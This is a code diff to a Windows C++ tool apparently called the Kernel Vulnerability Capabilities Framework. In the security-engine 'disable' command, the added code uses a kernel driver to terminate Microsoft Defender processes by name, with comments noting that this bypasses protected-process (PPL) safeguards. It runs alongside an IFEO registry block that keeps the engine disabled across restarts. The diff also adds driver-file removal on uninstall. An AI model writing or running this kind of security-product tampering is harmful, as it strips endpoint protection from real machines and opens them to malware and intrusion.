@@ -12,6 +12,7 @@
 #include "ServiceManager.h"
 #include "HiveManager.h"
 #include "ModuleManager.h"
+#include <TlHelp32.h>
 #include <signal.h>
 #include <charconv>
 #include <Shlobj.h>
@@ -184,7 +185,15 @@ int HandleDriverCommand(int argc, wchar_t* argv[]) {
 int HandleUninstall(int, wchar_t**) {
     INFO(L"Uninstalling Kernel Vulnerability Capabilities Framework service...");
     bool success = ServiceManager::UninstallService();
-    
+
+    // Remove driver files from DriverStore with TrustedInstaller privileges.
+    // ServiceManager::UninstallService() only deletes the SCM entry; file cleanup
+    // requires TI rights and must be done explicitly here.
+    // NOTE: UninstallDriver() returns early when the SCM entry is already gone,
+    // so we call DeleteDriverFiles() directly to guarantee file removal.
+    INFO(L"Removing driver files from DriverStore...");
+    g_controller->DeleteDriverFiles();
+
     INFO(L"Cleaning up registry configuration...");
     HKEY hKey;
     if (RegOpenKeyExW(HKEY_CURRENT_USER, L"Software", 0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
@@ -334,14 +343,56 @@ int HandleSecEngineCommand(int argc, wchar_t* argv[]) {
     // an immediate system restart after the IFEO block is written.
     if (sub == L"disable") {
         bool doRestart = (argc > 3 && std::wstring(argv[3]) == L"--restart");
-        if (DefenderManager::DisableSecurityEngine()) {
+
+        // Step 1: set IFEO block (persistent — survives even if kernel kill fails)
+        if (!DefenderManager::DisableSecurityEngine())
+            return 1;
+
+        // Step 2: kernel kill via kvcstrm (bypasses PPL/PP — no restart needed).
+        // EnsureStrmOpen auto-starts kvcstrm service if registered but not running;
+        // CleanupStrm stops it afterward only when we auto-started it.
+        bool killedViaKernel = false;
+        if (g_controller) {
+            bool autoStarted = false;
+            if (g_controller->EnsureStrmOpen(autoStarted)) {
+                static const wchar_t* defenderProcs[] = {
+                    L"MsMpEng.exe", L"NisSrv.exe", L"MpCmdRun.exe", L"MpDefenderCoreService.exe"
+                };
+                HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+                if (hSnap != INVALID_HANDLE_VALUE) {
+                    PROCESSENTRY32W pe{ sizeof(pe) };
+                    if (Process32FirstW(hSnap, &pe)) {
+                        do {
+                            for (const wchar_t* procName : defenderProcs) {
+                                if (_wcsicmp(pe.szExeFile, procName) == 0) {
+                                    g_controller->GetStrm().KillProcessLegacy(pe.th32ProcessID);
+                                    if (_wcsicmp(procName, L"MsMpEng.exe") == 0) {
+                                        SUCCESS(L"MsMpEng.exe (PID %lu) terminated via kernel (kvcstrm)", pe.th32ProcessID);
+                                        killedViaKernel = true;
+                                    }
+                                }
+                            }
+                        } while (Process32NextW(hSnap, &pe));
+                    }
+                    CloseHandle(hSnap);
+                }
+                g_controller->CleanupStrm(autoStarted);
+            } else {
+                INFO(L"kvcstrm not available — register with: kvc driver load kvcstrm");
+            }
+        }
+
+        if (!killedViaKernel) {
             if (doRestart) {
                 INFO(L"Initiating system restart...");
                 InitiateSystemRestart();
+            } else {
+                INFO(L"kvcstrm not loaded — system restart required to stop the engine");
+                INFO(L"Load kvcstrm first: kvc driver load kvcstrm");
             }
-            return 0;
         }
-        return 1;
+
+        return 0;
     }
 
     // ── enable ───────────────────────────────────────────────────────────────
